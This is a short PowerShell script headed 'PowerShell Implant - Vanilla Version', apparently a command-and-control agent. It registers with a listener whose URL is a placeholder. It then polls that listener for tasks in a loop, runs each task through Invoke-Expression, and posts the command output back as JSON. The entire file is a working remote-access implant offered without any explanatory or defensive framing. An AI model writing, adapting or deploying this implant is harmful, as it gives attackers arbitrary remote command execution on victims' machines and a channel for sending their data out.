#PowerShell Implant - Vanilla Version
$agentid = ""
while ($true) {
    $url = "AWS_URL_LISTENER_HERE"
    try {
        if ($agentid -eq "") {
            $agentid =  (iwr "$($url)agent-registration").content
        }
        else {
            $getTask =  (Invoke-WebRequest "$($url)?hostid=$agentid").content
            if ($getTask -eq "") { Start-Sleep(1) }
            else {
                $taskID = $getTask.split(":")[0]
                $command = $getTask -replace "$($taskID):",""
                $result = try{(iex $command 2>&1 | Out-String )} catch {($error[0] | Out-String)}
                $body = @{"hostid"="$agentid";"taskid"="$taskID";"task"="$command";"taskResponse"="$($result.Trim())"} | ConvertTo-Json
                Invoke-WebRequest "$($url)" -Method Post -body $body | Out-Null
            }
        }
        Start-Sleep(1)
    }
    catch {
        Start-Sleep(10)
    }
}